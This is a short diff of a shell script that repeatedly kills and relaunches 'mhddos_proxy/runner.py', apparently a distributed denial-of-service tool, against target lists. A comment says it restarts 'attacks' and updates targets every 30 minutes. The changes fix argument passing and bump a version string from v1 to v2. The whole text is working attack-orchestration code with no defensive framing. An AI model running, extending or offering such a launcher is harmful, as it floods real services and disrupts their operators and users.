@@ -177,7 +177,7 @@ while [ "$1" != "" ]; do
         --no-uvloop ) export uvloop="off"; shift ;;
         -h | --help )    usage;   exit ;;
         #*  )   usage;   exit ;;
-        *   ) $args_to_pass+=" $1 $2"; shift 2; echo $args_to_pass && echo " v1" && sleep 2 ;;
+        *   ) export args_to_pass+=" $1 $2"; shift 2; echo $args_to_pass && echo " v2" && sleep 2 ;;
     esac
 done
 
@@ -218,7 +218,7 @@ fi
 # Restart attacks and update targets every 30 minutes
 while true; do
         pkill -f start.py; pkill -f runner.py 
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $args_to_pass& #$threads $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $args_to_pass $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
